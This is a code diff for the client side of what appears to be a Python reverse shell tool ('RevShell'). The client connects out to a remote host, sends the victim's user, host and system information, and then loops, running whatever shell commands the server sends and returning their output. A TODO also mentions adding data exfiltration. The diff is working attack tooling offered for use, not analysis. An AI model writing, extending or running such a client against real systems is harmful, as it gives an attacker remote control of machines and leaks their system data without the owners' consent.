@@ -1,4 +1,6 @@
 # TODO: create handling for data exfiltration
+import getpass
+
 from .nodeutils import (
     os,
     shutil,
@@ -14,17 +16,59 @@ from .nodeutils import (
 
 class Client(StreamSocket):
     """TCP socket client class for the command shell"""
-    def __init__(self, rhost: str, port: int, shell: str, verb: bool, debug: bool):
-        super().__init__(rhost, port, shell, verb, debug)
+    # TODO: add handling for custom shell executables
+    def __init__(
+        self,
+        rhost: str,
+        port: int,
+        opsys: str,
+        verb: bool,
+        debug: bool,
+        shell: str = None
+    ):
+        shell_path, name = self.get_exec(opsys, shell)
+        if verb:
+            utils.status(f"shell => {name}")
+        super().__init__(rhost, port, shell_path, verb, debug)
+
+    def execute(self, command: str) -> (bytes, bytes, bytes):
+        """Execute the command using system shell subprocess,
+        returns the a list of stdin, stdout, and stderr."""
+        family = self.check_special(command)
+
+        if family is not None:
+            if family == "clear":
+                return [command.encode(), utils.Ansi.clear(), b""]
+
+            if family == "cd":
+                # TODO: fix change_dir from assigning relative path
+                exists, path = self.change_dir(command)
+
+                if exists:
+                    self.LastWD = str(path)
+
+                    return [command.encode(), str(path).encode(), b""]
+                else:
+                    error_msg = f"Cannot resolve path {path}".encode()
+                    return [command.encode(), b"", error_msg]
+
+            if family == "ls":
+                if utils.OPSYS != "nt":
+                    command = f"{command} -A --color"
+
+            # TODO: fix issue with grep throwing false-positives
+            elif family == "grep":
+                if utils.OPSYS != "nt":
+                    #command = f"{command} -i --color"
+                    command = f"{command} --color"
+
+        return self._run_cmd(command, self.Shell)
 
     def connect(self) -> None:
         """Initiate connection to remote server shell"""
-        # TODO: spawn process for shell instead running single commands
-        # TODO: configure timeouts and blocking
-
+        # TODO: configure timeouts and blocking, then test
         sock = socket.socket()
         #sock.settimeout(60)
-        #executable = self.get_exec()
 
         try:
             sock.connect((self.Address, self.Port))
@@ -34,28 +78,41 @@ class Client(StreamSocket):
             utils.throw(f"Could not establish connection with {self.Address}")
 
         try:
-            # receive => established message
-            establish_msg = self.receive(sock).decode()
+            # receive <== connection established message
+            establish_msg = self.recv_msg(sock)
             utils.status(establish_msg)
 
-            # send => system information
-            sysinfo = self.sys_info()
+            if utils.OPSYS == "nt":
+                self.LastWD = os.getenv("USERPROFILE")
+            else:
+                self.LastWD = os.getenv("HOME")
+
+            hostinfo, sysinfo = self.get_sysinfo()
+
+            # send ==> current user/host information
+            self.send(sock, hostinfo)
+
+            # send ==> system information
             self.send(sock, sysinfo)
 
-            # TODO: add code to send working directory to server each iteration
-            # TODO: to achieve => send input right back, add condition in server logic
-
             while True:
-                # receive => command to execute
-                command = self.receive(sock).decode()
+                # receive <== command to execute
+                command = self.recv_msg(sock)
                 family = self.check_special(command)
 
                 if family != "exit":
-                    stdout, stderr = self.execute(command)
+                    cmd_out = self.execute(command)
+                    cmd = bytes(cmd_out[0])
+                    stdout = bytes(cmd_out[1])
+                    stderr = bytes(cmd_out[2])
 
-                    # TODO: update displayed path after changed directory
+                    if stderr == b"":
+                        if family == "cd":
+                            if stdout == b"":
+                                self.LastWD = cmd.decode().split()[1]
+                            else:
+                                self.LastWD = stdout.decode()
 
-                    if stdout != b"":
                         output = stdout
                         level = "output"
                     else:
@@ -63,15 +120,19 @@ class Client(StreamSocket):
                         level = "error"
 
                     if self.Debug:
+                        # TODO: fix and test debug options
                         utils.status(bytes(output).decode(), level, command)
                     elif self.Verbose:
-                        utils.status(f"stdin => [{command}]", level)
+                        utils.stdin_status(command, level)
 
-                    # send => command output
-                    self.send(sock, output)
+                    # send ==> command output
+                    if output == stdout:
+                        self.send_output(sock, output.decode(), "stdout")
+                    else:
+                        self.send_output(sock, output.decode(), "stderr")
                 else:
                     if self.Verbose:
-                        utils.status("stdin => [exit]", "output")
+                        utils.stdin_status("exit")
                         utils.status("Exiting RevShell.")
                     break
         except Exception as exc:
